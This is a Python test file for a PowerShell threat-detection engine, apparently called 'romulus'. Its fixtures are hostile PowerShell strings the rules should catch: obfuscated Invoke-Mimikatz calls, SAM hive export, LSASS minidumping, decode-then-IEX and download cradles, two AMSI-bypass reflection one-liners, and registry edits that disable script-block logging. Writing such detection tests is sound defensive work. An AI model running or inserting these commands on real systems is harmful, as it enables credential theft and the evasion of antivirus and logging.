"""Reviewed native PowerShell lexical, identity and evidence boundaries."""
import subprocess
import sys
from pathlib import Path

import pytest

if __name__ == "__main__":
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from romulus.detect import powershell_tokens as tokens
from romulus.detect.windows_scripts import WINDOWS_SCRIPT_PLAYBOOKS
from tests.test_windows_script_rules import RULES, script
from tests.windows_event_support import run


def test_large_invalid_input_has_a_time_bound_and_honest_partial_result():
    result = subprocess.run([sys.executable, str(Path(__file__).resolve()), "--scale-probe"],
                            check=False, capture_output=True, text=True, timeout=8)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "partial=True" in result.stdout


def test_a_batch_is_parsed_once_per_event_shared_across_rules(monkeypatch):
    original, calls = tokens.read_script, []
    def counted(text):
        calls.append(text)
        return original(text)
    monkeypatch.setattr(tokens, "read_script", counted)
    batch = [script("Get-Date", native="one"), script("Get-ChildItem", native="two")]
    for cls in WINDOWS_SCRIPT_PLAYBOOKS:
        cls().consume(batch)
    assert calls == ["Get-Date", "Get-ChildItem"]


@pytest.mark.parametrize("text", [
    "Inv'oke-Mimi'katz", ". 'Invoke-Mimikatz'", ". ('Invoke-'+'Mimikatz')",
    "Invoke-Mimikatz # comment", "Write-Output a#b; Invoke-Mimikatz",
    "\u2018x\u2019; Invoke-Mimikatz", "& \u2018Invoke-Mimikatz\u2019",
])
def test_native_invocation_forms_surface(text):
    assert RULES["offensive_function"]().consume([script(text)])


@pytest.mark.parametrize("text", [
    "'a'+'b'; & $p", "'a'+'b'; Get-Date 2>&1", "'{0} done' -f $n; & $s",
])
def test_unrelated_obfuscated_data_and_redirection_do_not_assert_obfuscated_execution(text):
    assert not RULES["obfuscated_execution"]().consume([script(text)])


def test_literal_bracket_does_not_make_complete_code_partial():
    assert not tokens.read_script("Write-Output '('").partial


def test_identical_code_new_block_guids_folds_but_new_host_is_immediate():
    rule = RULES["offensive_function"]()
    first = script("Invoke-Mimikatz", block="block-a", native="a")
    second = script("Invoke-Mimikatz", block="block-b", native="b")
    other_host = script("Invoke-Mimikatz", block="block-c", native="c")
    other_host.host = "ws02"
    assert len(rule.consume([first])) == 1
    assert not rule.consume([second])
    assert len(rule.consume([other_host])) == 1


def test_complete_join_corrects_fragment_mention_in_place_without_withdrawing():
    part = script("Invoke-Mimikatz", view="fragment", complete=False, native="part")
    joined = script("<#\nInvoke-Mimikatz\n#>", view="joined", native="join")
    [stored] = run(RULES["offensive_function"](), [[part], [joined]])
    assert stored.proposed_lane == "lead"
    assert stored.revision_reason
    assert "comment" in stored.claim.lower() or "data" in stored.claim.lower()
    assert stored.events[0].id == joined.id


@pytest.mark.parametrize("name,text", [
    ("offensive_function", "Invoke-Mimikatz"),
    ("sam_access", "reg.exe save HKLM\\SAM C:\\Temp\\sam"),
    ("lsass_access", "Get-Process lsass | Out-Minidump"),
])
def test_evidence_supported_script_lanes_upgrade_only_with_complete_code(name, text):
    rule = RULES[name]()
    [fragment] = rule.consume([script(text, view="fragment", complete=False, native="part")])
    [joined] = rule.consume([script(text, view="joined", native="join")])
    assert fragment.proposed_lane == "lead" and joined.proposed_lane == "high"
    assert joined.group_key == fragment.group_key and joined.revision_reason


def test_tool_definition_and_system_hive_export_remain_leads():
    [definition] = RULES["offensive_function"]().consume([script("function Invoke-Mimikatz { }")])
    [system] = RULES["sam_access"]().consume([script("reg.exe save HKLM\\SYSTEM C:\\Temp\\system")])
    assert definition.proposed_lane == system.proposed_lane == "lead"


@pytest.mark.parametrize("text", [
    "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)))",
    "$s = New-Object System.IO.Compression.GzipStream($bytes); IEX $reader.ReadToEnd()",
])
def test_decode_then_evaluate_is_a_positive_shape(text):
    assert "decode_evaluation" in RULES
    assert RULES["decode_evaluation"]().consume([script(text)])


@pytest.mark.parametrize("text", [
    "IEX $client.DownloadString.Invoke('https://example.test/a')",
    "$ExecutionContext.InvokeCommand.InvokeScript($request.GetResponseStream())",
])
def test_download_and_broader_evaluation_shapes_surface(text):
    assert RULES["download"]().consume([script(text)])


@pytest.mark.parametrize("text", [
    "[Ref].Assembly.GetType(('System.Management.Automation.Amsi'+'Utils')).GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true)",
    "[Ref].Assembly.GetTypes() | Where-Object {$_.Name -like '*iUtils'} | ForEach-Object {$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}",
])
def test_constructed_amsi_type_and_reflection_filter_surface(text):
    assert RULES["amsi_bypass"]().consume([script(text)])


def test_registry_disable_arguments_and_process_aliases_have_native_roles():
    policy = r"HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    request = "Set-ItemProperty -Path '" + policy + "' -Name EnableScriptBlockLogging -Value (0)"
    assert RULES["logging_disable"]().consume([script(request)])
    assert not RULES["logging_disable"]().consume([script(request.replace("Set-ItemProperty", "set"))])
    assert RULES["logging_disable"]().consume([script(
        "reg.exe add '" + policy.replace(":", "") + "' /v EnableScriptBlockLogging /t REG_DWORD /d 0")])
    assert RULES["lsass_access"]().consume([script("gps lsass | Out-Minidump")])


def test_complete_join_replaces_a_partial_join_at_equal_view_rank():
    rule = RULES["offensive_function"]()
    [partial] = rule.consume([script("Invoke-Mimikatz", view="joined", complete=False, native="partial")])
    [complete] = rule.consume([script("Invoke-Mimikatz", view="joined", complete=True, native="complete")])
    assert partial.proposed_lane == "lead" and complete.proposed_lane == "high"
    assert partial.group_key == complete.group_key and complete.revision_reason


def test_fragment_context_is_resolved_without_a_permanent_partial_limit():
    rule = RULES["offensive_function"]()
    rule.consume([script("Invoke-Mimikatz", view="fragment", complete=False, native="fragment")])
    rule.consume([script("Invoke-Mimikatz", view="joined", native="joined")])
    rule.finalize()
    assert not rule.limits


if __name__ == "__main__" and "--scale-probe" in sys.argv:
    text = "']'::b()," * 131072
    parsed = tokens.read_script(text)
    assert parsed.partial
    print("partial=True")
